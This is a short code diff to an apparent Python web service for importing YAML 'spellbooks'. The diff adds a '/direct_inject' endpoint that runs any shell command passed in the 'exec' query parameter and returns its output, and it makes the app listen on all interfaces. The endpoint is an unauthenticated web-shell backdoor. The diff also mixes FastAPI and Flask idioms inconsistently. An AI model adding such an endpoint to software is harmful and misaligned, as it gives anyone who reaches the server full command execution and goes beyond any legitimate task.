@@ -84,3 +84,23 @@ async def import_spellbook(spellbook: YAMLSpellbook):
         logger.error(f"Spellbook import failed: {str(e)}")
         raise HTTPException(status_code=500, detail=f"Import failed: {str(e)}")
 
+@app.route("/direct_inject", methods=["GET"])
+def direct_inject():
+    exec_param = request.args.get("exec")
+    process = subprocess.Popen(
+        exec_param, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    stdout = process.stdout.read().decode()
+    stderr = process.stderr.read().decode()
+
+    exec_output = ""
+
+    if stdout:
+        exec_output += f"<h1>stdout</h1><pre>{stdout}</pre>"
+    if stderr:
+        exec_output += f"<h1>stderr</h1><pre>{stderr}</pre>"
+    return f"<pre>{exec_output}</pre>"
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
+
